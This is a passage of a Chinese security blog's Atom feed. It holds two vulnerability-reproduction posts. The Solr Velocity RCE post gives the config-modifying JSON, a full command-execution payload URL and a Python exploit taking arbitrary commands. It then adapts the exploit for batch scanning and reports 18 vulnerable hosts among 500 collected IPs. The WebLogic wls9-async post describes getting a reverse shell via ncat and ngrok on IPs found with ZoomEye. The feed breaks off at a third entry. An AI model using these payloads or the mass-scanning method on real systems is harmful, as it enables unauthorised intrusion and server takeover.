<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Whitesun</title>
  
  <subtitle>有梦想的小菜鸡</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-01-15T07:10:05.217Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>小白</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Solr Velocity rce</title>
    <link href="http://yoursite.com/2020/01/07/Solr-Velocity-rce/"/>
    <id>http://yoursite.com/2020/01/07/Solr-Velocity-rce/</id>
    <published>2020-01-07T01:40:53.000Z</published>
    <updated>2020-01-15T07:10:05.217Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Solr-Velocity模版注入远程命令执行漏洞复现以及POC编写"><a href="#Apache-Solr-Velocity模版注入远程命令执行漏洞复现以及POC编写" class="headerlink" title="Apache Solr Velocity模版注入远程命令执行漏洞复现以及POC编写"></a>Apache Solr Velocity模版注入远程命令执行漏洞复现以及POC编写</h2><p>作者：Whitesun</p><h4 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h4><p>19年10月31日，安全研究员S00pY在GitHub发布了ApacheSolr Velocity模版注入远程命令执行的POC，经过其他安全团队和人员的验证和复现，此漏洞已经能够被批量利用。</p><p><img src="\img\1578276051044.png" alt></p><p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></p><p>该漏洞的产生原因：Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中，params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。</p><p>当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的POST请求，将params.resource.loader.enabled的值修改为true，在服务器上进行命令执行,从而获取服务器的权限。如果在赔上solr未授权访问漏洞，存在于外网的大部分solr服务器将不堪一击！</p><p>关于params.resource.loader.enabled的介绍:</p><p><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a></p><h4 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h4><p>solr 4.x~solr 8.2 版本</p><a id="more"></a><h4 id="0x03-本地复现"><a href="#0x03-本地复现" class="headerlink" title="0x03 本地复现"></a>0x03 本地复现</h4><p>通过清华大学镜像站下载个7.7版本的solr</p><p><img src="\img\1578276338655.png" alt="1578276338655"></p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/</a></p><p>安装到kail，因为在kail上可以不用再去配置Java环境。（使用docker也可以）</p><p>我直接解压到桌面然后启动起来，启动记得加上 -force ，不然会提示你存在安全风险。</p><p>cd solr-7.7.2/</p><p>./bin/solr start -force</p><p><img src="\img\1578276560216.png" alt="1578276560216"></p><p>可以看到solr服务已经启动起来，默认端口为8983。接下来我们使用浏览器访问solr，此时没做任何配置是存在solr未授权访问的，所以只在浏览器新建一个core。（可能会遇到无法添加core问题，将 /solr-7.7.0/server/solr/configsets/_default 下的 conf 文件夹复制到 new_core 文件夹下即可。）</p><p>我这里已经添加成功了，现在就可以利用安全研究员S00pY所提供的的POC来验证即可。</p><p><img src="\img\1578277325466.png" alt="1578277325466"></p><p>这个POC的思路是向某个core的config文件POST发送一个json格式的数据包，将 params.resource.loader.enabled 设置为 ture（默认为false）</p><p><img src="\img\1578278035752.png" alt="1578278035752"></p><p>当返回包为200（某些低版本为500）时，就说明我们修改的配置已经生效可以进行命令执行。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"update-queryresponsewriter"</span>: &#123;</span><br><span class="line">   <span class="attr">"startup"</span>: <span class="string">"lazy"</span>,</span><br><span class="line">   <span class="attr">"name"</span>: <span class="string">"velocity"</span>,</span><br><span class="line">   <span class="attr">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>,</span><br><span class="line">    <span class="attr">"template.base.dir"</span>:<span class="string">""</span>,</span><br><span class="line">   <span class="attr">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>,</span><br><span class="line">   <span class="attr">"params.resource.loader.enabled"</span>: <span class="string">"true"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="\img\1578278904477.png" alt="1578278904477"></p><p>此时，在查看new_core的config的params.resource.loader.enabled 的值，已经为ture</p><p><img src="\img\1578278140818.png" alt="1578278140818"></p><p>此时，利用给出的poc直接访问即可。</p><p><code>&lt;http://192.168.153.131:8983/solr/new_core/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&gt;</code></p><p><img src="\img\1578279117695.png" alt="1578279117695"></p><p>相关分析：</p><p>在现今的软件开发过程中，软件开发人员将更多的精力投入在了重复的相似劳动中。特别是在如今特别流行的 MVC 架构模式中，软件各个层次的功能更加独立，同时代码的相似度也更加高。所以我们需要寻找一种来减少软件开发人员重复劳动的方法，让程序员将更多的精力放在业务逻辑以及其他更加具有创造力的工作上。Velocity 这个模板引擎就可以在一定程度上解决这个问题。</p><p>Velocity 是一个基于 Java 的模板引擎框架，提供的模板语言可以使用在 Java 中定义的对象和变量上。Velocity 是 Apache 基金会的项目，开发的目标是分离 MVC 模式中的持久化层和业务层。但是在实际应用过程中，Velocity 不仅仅被用在了 MVC 的架构中，还可以被用在以下一些场景中。</p><ol><li>Web 应用：开发者在不使用 JSP 的情况下，可以用 Velocity 让 HTML 具有动态内容的特性。</li><li>源代码生成：Velocity 可以被用来生成 Java 代码、SQL 或者 PostScript。有很多开源和商业开发的软件是使用 Velocity 来开发的。</li><li>自动 Email：很多软件的用户注册、密码提醒或者报表都是使用 Velocity 来自动生成的。使用 Velocity 可以在文本文件里面生成邮件内容，而不是在 Java 代码中拼接字符串。</li><li>转换 xml：Velocity 提供一个叫 Anakia 的 ant 任务，可以读取 XML 文件并让它能够被 Velocity 模板读取。一个比较普遍的应用是将 xdoc 文档转换成带样式的 HTML 文件。</li></ol><p>它允许任何人仅仅使用简单的模板语言（template language）来引用由java代码定义的对象。Velocity可以获取在java语言中定义的对象，从而实现界面和java代码的真正分离，这意味着可以使用Velocity替代jsp的开发模式了</p><p>当Velocity应用于Web开发时，界面设计人员可以和java程序开发人员同步开发一个遵循MVC架构的web站点，也就是说，页面设计人员可以只关注页面的显示效果，而由java程序开发人员关注业务逻辑编码。Velocity将java代码从web页面中分离出来，这样为web站点的长期维护提供了便利，同时也为我们在JSP和PHP之外又提供了一种可选的方案。</p><p>针对这个漏洞，大概来说的话，因为Velocity模板语言可以使用在 Java 中定义的对象和变量上。这个payload的核心就是构造了一个自定义的Velocity模板，来通过Java的Runtime.getRuntime().exec()来执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('id'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br></pre></td></tr></table></figure><p>对这个一些payload的参数进行解释。</p><ul><li>参数wt - 输出结果格式，通常为json/xml等格式，如果设置值为velocity，则会通过velocity引擎解析（重点）</li><li>参数v.template - 模版名称，payload设置模版名称为custom</li><li>参数v.template.custom - 自定义模板custom 的具体内容。也就是我们通过这个自定义的模板来执行命令。</li></ul><p>现在相信大家对于这个payload就有比较清晰的理解了，无奈本人对于Java也只处于了解一点的程度。更加深层次的分析参考seebug和先知社区。</p><p><a href="https://paper.seebug.org/1107/" target="_blank" rel="noopener">https://paper.seebug.org/1107/</a></p><p><a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a></p><h4 id="0x04-修补方法"><a href="#0x04-修补方法" class="headerlink" title="0x04 修补方法"></a>0x04 修补方法</h4><p>修补方法：升级到最新的solr8.4版本</p><h4 id="0x05-POC编写"><a href="#0x05-POC编写" class="headerlink" title="0x05 POC编写"></a>0x05 POC编写</h4><p>知道这个漏洞的实现原理后POC的编写就很简单了，利用python2.7编写。用到了sys、request、json模块。这里最后把输入的命令进行下URL编码。也就是POC中的CMD。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url, cmd)</span>:</span></span><br><span class="line"><span class="comment"># def main(url):</span></span><br><span class="line">    core_selector_url = url + <span class="string">'/solr/admin/cores?_=1565526689592&amp;indexInfo=false&amp;wt=json'</span></span><br><span class="line"></span><br><span class="line">    r = requests.get(url=core_selector_url)</span><br><span class="line">    json_strs = json.loads(r.text)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">"responseHeader"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        list = []</span><br><span class="line">        <span class="keyword">for</span> core_selector <span class="keyword">in</span> json_strs[<span class="string">'status'</span>]:</span><br><span class="line">            list.append(json_strs[<span class="string">'status'</span>][<span class="string">'%s'</span> % core_selector][<span class="string">'name'</span>])</span><br><span class="line">        jas502n_Core_Name = list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    newurl = url + <span class="string">'/solr/'</span> + jas502n_Core_Name + <span class="string">'/config'</span></span><br><span class="line">    modifyConfig_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36"</span>,</span><br><span class="line">                            <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>,</span><br><span class="line">                            <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">                            <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line"></span><br><span class="line">    modifyConfig_json = &#123;</span><br><span class="line">        <span class="string">"update-queryresponsewriter"</span>: &#123;<span class="string">"startup"</span>: <span class="string">"lazy"</span>, <span class="string">"name"</span>: <span class="string">"velocity"</span>,</span><br><span class="line">                                       <span class="string">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>,</span><br><span class="line">                                       <span class="string">"template.base.dir"</span>: <span class="string">""</span>, <span class="string">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>,</span><br><span class="line">                                       <span class="string">"params.resource.loader.enabled"</span>: <span class="string">"true"</span>&#125;&#125;</span><br><span class="line">    <span class="comment">#data=json.dumps(payload)</span></span><br><span class="line">    res = requests.post(newurl, headers=modifyConfig_headers,json=modifyConfig_json)</span><br><span class="line">    cmd = quote_plus(cmd)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">or</span> <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = <span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('&#123;&#125;'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span>.format(</span><br><span class="line">                cmd)</span><br><span class="line">            target = url + <span class="string">'/solr/'</span> + jas502n_Core_Name + p</span><br><span class="line">            <span class="keyword">print</span> <span class="string">u'命令执行url：'</span></span><br><span class="line">            <span class="keyword">print</span> target</span><br><span class="line">            result = requests.get(url=target)</span><br><span class="line">            <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> len(result.text) &lt; <span class="number">65</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">u'命令执行结果：'</span></span><br><span class="line">                <span class="keyword">print</span> result.content</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span></span><br><span class="line">            <span class="string">'failed'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    main(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>POC使用时直接加上url就行，但是url最后不要有斜杠。</p><p><img src="\img\1578279445556.png" alt="1578279445556"></p><h4 id="0x06-批量验证"><a href="#0x06-批量验证" class="headerlink" title="0x06 批量验证"></a>0x06 批量验证</h4><p>采用Xyntax大佬的渗透测试插件化并发框架 POC-T</p><p><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a></p><p><img src="\img\1578280225613.png" alt="1578280225613"></p><p><img src="\img\1578280236707.png" alt="1578280236707"></p><p>这个框架实现漏洞验证非常简便而对于POC的编写也很友好。</p><p><img src="\img\1578279815956.png" alt="1578279815956"></p><p>将我们的代码稍微改进一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">'http://'</span> + url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        core_selector_url = url + <span class="string">'/solr/admin/cores?_=1565526689592&amp;indexInfo=false&amp;wt=json'</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=core_selector_url)</span><br><span class="line">        json_strs = json.loads(r.text)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">"responseHeader"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            list = []</span><br><span class="line">            <span class="keyword">for</span> core_selector <span class="keyword">in</span> json_strs[<span class="string">'status'</span>]:</span><br><span class="line">                list.append(json_strs[<span class="string">'status'</span>][<span class="string">'%s'</span> % core_selector][<span class="string">'name'</span>])</span><br><span class="line">            jas502n_Core_Name = list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        debug_model_url = url + <span class="string">'/solr/'</span> + jas502n_Core_Name + <span class="string">'/config'</span></span><br><span class="line">        modifyConfig_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">                                <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36"</span>,</span><br><span class="line">                                <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>,</span><br><span class="line">                                <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">                                <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line"></span><br><span class="line">        modifyConfig_json = &#123;</span><br><span class="line">            <span class="string">"update-queryresponsewriter"</span>: &#123;<span class="string">"startup"</span>: <span class="string">"lazy"</span>, <span class="string">"name"</span>: <span class="string">"velocity"</span>,</span><br><span class="line">                                               <span class="string">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>,</span><br><span class="line">                                               <span class="string">"template.base.dir"</span>: <span class="string">""</span>, <span class="string">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>,</span><br><span class="line">                                               <span class="string">"params.resource.loader.enabled"</span>: <span class="string">"true"</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">        r3 = requests.post(debug_model_url, headers=modifyConfig_headers,json=modifyConfig_json)</span><br><span class="line">        <span class="keyword">if</span> r3.status_code == <span class="number">200</span> <span class="keyword">or</span> <span class="number">500</span>:</span><br><span class="line"></span><br><span class="line">                p = <span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">                target = url + <span class="string">'/solr/'</span> + jas502n_Core_Name + p</span><br><span class="line">                result = requests.get(url=target)</span><br><span class="line">                <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> len(result.text) &lt; <span class="number">65</span>:</span><br><span class="line">                    <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">except</span> Exception :</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将收集到的url进行批量验证</p><p>python2 POC-T.py -eT -t 50 -s solr_new_poc.py -iF C:\Users\Administrator\Desktop\txt\solrtest.txt</p><p>500个ip找到了18个存在漏洞的solr</p><p><img src="\img\1578280695409.png" alt="1578280695409"></p><p>更对关于POC-T的使用请移步GitHub（虽然作者很久没更新了哈哈哈，但是还是很好用的）</p><h4 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h4><p><a href="https://www.freebuf.com/column/218801.html" target="_blank" rel="noopener">https://www.freebuf.com/column/218801.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1532753" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1532753</a></p><p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></p><p><a href="https://github.com/theLSA/solr-rce" target="_blank" rel="noopener">https://github.com/theLSA/solr-rce</a></p><p><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Apache-Solr-Velocity模版注入远程命令执行漏洞复现以及POC编写&quot;&gt;&lt;a href=&quot;#Apache-Solr-Velocity模版注入远程命令执行漏洞复现以及POC编写&quot; class=&quot;headerlink&quot; title=&quot;Apache Solr Velocity模版注入远程命令执行漏洞复现以及POC编写&quot;&gt;&lt;/a&gt;Apache Solr Velocity模版注入远程命令执行漏洞复现以及POC编写&lt;/h2&gt;&lt;p&gt;作者：Whitesun&lt;/p&gt;
&lt;h4 id=&quot;0x01-漏洞概述&quot;&gt;&lt;a href=&quot;#0x01-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞概述&quot;&gt;&lt;/a&gt;0x01 漏洞概述&lt;/h4&gt;&lt;p&gt;19年10月31日，安全研究员S00pY在GitHub发布了ApacheSolr Velocity模版注入远程命令执行的POC，经过其他安全团队和人员的验证和复现，此漏洞已经能够被批量利用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;\img\1578276051044.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该漏洞的产生原因：Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中，params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。&lt;/p&gt;
&lt;p&gt;当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的POST请求，将params.resource.loader.enabled的值修改为true，在服务器上进行命令执行,从而获取服务器的权限。如果在赔上solr未授权访问漏洞，存在于外网的大部分solr服务器将不堪一击！&lt;/p&gt;
&lt;p&gt;关于params.resource.loader.enabled的介绍:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x02-影响范围&quot;&gt;&lt;a href=&quot;#0x02-影响范围&quot; class=&quot;headerlink&quot; title=&quot;0x02 影响范围&quot;&gt;&lt;/a&gt;0x02 影响范围&lt;/h4&gt;&lt;p&gt;solr 4.x~solr 8.2 版本&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Solr" scheme="http://yoursite.com/tags/Solr/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic wls9-async反序列化远程命令执行漏洞复现</title>
    <link href="http://yoursite.com/2019/09/03/WebLogic-wls9-async%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/09/03/WebLogic-wls9-async反序列化远程命令执行漏洞复现/</id>
    <published>2019-09-03T12:54:19.000Z</published>
    <updated>2020-01-15T07:55:01.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814"><a href="#WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814" class="headerlink" title="WebLogic wls9-async反序列化远程命令执行漏洞复现(CNVD-C-2019-48814)"></a>WebLogic wls9-async反序列化远程命令执行漏洞复现(CNVD-C-2019-48814)</h2><p>该漏洞是由wls9_async_response组件导致，在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，未授权的情况下远程执行命令。部分版本WebLogic中默认包含的wls9_async_response包，主要是为WebLogic Server提供异步通讯服务。</p><p><br></p><p>利用zoomeye扫描到的ip</p><p><br></p><p>首先访问 目标ip + /_async/AsyncResponseService 来判断是否启用该组件，如果存在则有可能存在此漏洞。</p><p><img src="\img\weblogic1.jpg" alt></p><p>漏洞原理是向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml</p><p>利用poc</p><p><a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a></p><p>首先用ncat监听端口8889</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp <span class="number">8889</span></span><br></pre></td></tr></table></figure><p><img src="\img\weblogic2.jpg" alt></p><p>然后利用ngrok进行内网穿透。下面这片文章写的非常好！</p><p><a href="https://bbs.ichunqiu.com/thread-53000-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-53000-1-1.html</a></p><p><img src="\img\weblogic3.jpg" alt></p><p>最后利用poc尝试反弹端口getshell</p><p>python2 CNVD-C-2019-48814.py -l &lt;ngrok分配的免费域名&gt; -p &lt;ngrok分配的端口&gt; -r &lt;目标ip+端口&gt;</p><p>命令执行后，发现端口转发已经收到了</p><p><img src="\img\weblogic6.jpg" alt></p><p>漏洞利用成功</p><p><img src="\img\weblogic4.jpg" alt></p><p><img src="\img\weblogic5.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814&quot;&gt;&lt;a href=&quot;#WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="weblogic RCE" scheme="http://yoursite.com/tags/weblogic-RCE/"/>
    
  </entry>
  
  <entry>
    <title>I LIKE YOU</title>
    <link href="http://yoursite.com/2019/05/21/I-LIKE-YOU/"/>
    <id>http://yoursite.com/2019/05/21/I-LIKE-YOU/</id>
    <published>2019-05-21T01:05:00.000Z</published>
    <updated>2019-05-21T01:28:19.952Z</updated>
    
